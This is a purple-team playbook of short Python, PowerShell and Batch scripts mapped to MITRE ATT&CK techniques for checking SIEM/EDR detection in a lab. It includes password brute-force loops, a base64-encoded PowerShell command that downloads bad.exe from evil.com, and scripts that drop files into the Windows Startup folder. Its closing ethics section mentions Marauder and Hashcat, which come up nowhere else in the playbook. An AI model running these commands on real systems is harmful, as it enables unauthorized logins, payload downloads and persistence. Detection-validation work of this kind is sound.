# Purple Team Playbook - Multi-Platform Scripts

---

## 🎯 Purpose

Integrate **Python**, **PowerShell**, and **Batch** scripts for realistic, multi-platform attack simulation & detection validation.

## ⚙️ Function

A tight, four-step scripted loop (pick a TTP → script the attack in Python/PowerShell/Batch → run it in an isolated lab → check SIEM/EDR for the resulting logs and alerts). This is the **script-centric variant** of the purple team playbooks - where `PurpleTeam_Simple.md` and `PurpleTeam_Detailed.md` describe the exercise process and tooling ecosystem, this file is specifically about writing and running the actual attack scripts that drive detection validation, organized by scripting language/platform.

## 🏆 Goal

Make it fast to go from "we want to validate detection for TTP X" to an actual runnable script and a confirmed SIEM/EDR alert (or confirmed detection gap) - minimizing the time between choosing a technique and getting a real answer about your detection coverage.

## 📋 When to Use

- You already have a purple team process (see `PurpleTeam_Simple.md`/`PurpleTeam_Detailed.md`) and need the actual attack script for a specific TTP
- Validating detection coverage for a technique across multiple platforms/languages (e.g., confirming both a PowerShell-based and Python-based version of the same TTP get caught)
- Building a reusable library of attack scripts mapped to MITRE ATT&CK techniques for repeat testing

## Tools to Keep Ready

| Type | Tool | Example |
|------|------|---------|
| Python | Custom scripts, Atomic Red Team helpers | |
| PowerShell | Live TTP emulation, Windows-native | |
| Batch | Simple persistence, process spawners | |

---

## Workflow (Recap)

1️⃣ Pick TTP

2️⃣ Script attack in Python/PowerShell/Batch

3️⃣ Run in isolated lab

4️⃣ Check SIEM/EDR for logs & alerts

5️⃣ Tune detection

6️⃣ Document and iterate

## Example Playbook Entries

Below are practical examples for each script type.

---

### 🧩 Example 1 - Brute Force

| Item | Value |
|------|-------|
| **TTP ID** | T1110 (Brute Force) |
| **Goal** | Test login failure detection |
| **Method (Python)** | Try multiple password attempts |
| **Method (PowerShell)** | Loop failed `net use` |
| **Method (Batch)** | Automate repeated auth attempts |

---

### ✅ Python

```python
import requests
from requests.auth import HTTPBasicAuth

users = ["admin"]
passwords = ["1234", "password", "admin"]

for user in users:
    for pwd in passwords:
        r = requests.get(
            "http://target/login",
            auth=HTTPBasicAuth(user, pwd)
        )
        print(f"{user}:{pwd} -> {r.status_code}")
```

---

### ✅ PowerShell

```powershell
# Attempt network share connection with bad creds
$User = "admin"
$Passwords = @("1234", "password", "admin")

foreach ($pwd in $Passwords) {
    net use \\target\IPC$ /user:$User $pwd
}
```

---

### ✅ Batch

```batch
@echo off
set USER=admin
set PASSWORDS=1234 password admin

for %%P in (%PASSWORDS%) do (
    net use \\target\IPC$ /user:%USER% %%P
)
```

---

### 🧩 Example 2 - Suspicious PowerShell

| Item | Value |
|------|-------|
| **TTP ID** | T1059 |
| **Goal** | Test detection of obfuscated PowerShell |
| **Method (PowerShell)** | Base64-encoded command |
| **Method (Batch)** | Spawn PowerShell with encoded script |

---

### ✅ PowerShell

```powershell
# Encoded command to download file
$Command = 'Invoke-WebRequest -Uri http://evil.com/bad.exe -OutFile C:\temp\bad.exe'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$Encoded = [Convert]::ToBase64String($Bytes)

powershell.exe -EncodedCommand $Encoded
```

---

### ✅ Batch

```batch
@echo off
REM Spawn PowerShell with encoded download command
powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AYgBhAGQALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAHQAZQBtAHAAXABiAGEAZAAuAGUAeABl
```

*(This string is the UTF-16 base64 version of `Invoke-WebRequest ...` above - can regenerate as needed.)*

---

### 🧩 Example 3 - Persistence via Startup (Batch)

| Item | Value |
|------|-------|
| **TTP ID** | T1547 |
| **Goal** | Validate detection of new startup entries |
| **Method (Batch)** | Drop script in startup folder |

---

### ✅ Batch

```batch
@echo off
REM Create a malicious batch file in startup folder
echo @echo Malicious Run >> %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\evil.bat
```

---

### ✅ PowerShell

```powershell
# Drop a startup script
$Path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1"
Set-Content $Path "Start-Process notepad.exe"
```

---

### 🧩 Example 4 - Python to Trigger SIEM Alert

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
syslog_server = ("192.168.1.100", 514)

message = "<134> LAB TEST: Detected Evil Activity!"
sock.sendto(message.encode(), syslog_server)
sock.close()
```

## Reporting Template

| Field | Example |
|-------|---------|
| TTP | T1110 |
| Goal | Validate brute force detection |
| Tool | Python + PowerShell + Batch |
| Log Source | Auth logs |
| SIEM Rule | Multiple failed logins |
| Result | Pass |
| Notes | Lockout threshold adjusted |

## Security and Ethical Considerations ⚠️

**IMPORTANT**: These tools are for **authorized security testing only**. Unauthorized use is illegal.

* **Marauder Use:** Get **written permission** before testing any network. Only test networks you own or have explicit authorization to test.
* **Cracking Use:** All cracking attempts (Hashcat) must be done in an **isolated lab environment** against hashes you are authorized to possess.
* **Legal Compliance:** Strictly comply with all local laws and regulations.

**Legal Use Cases:**
* Penetration testing with client authorization.
* Testing your own home or lab network security.
* Security research in isolated lab environments.
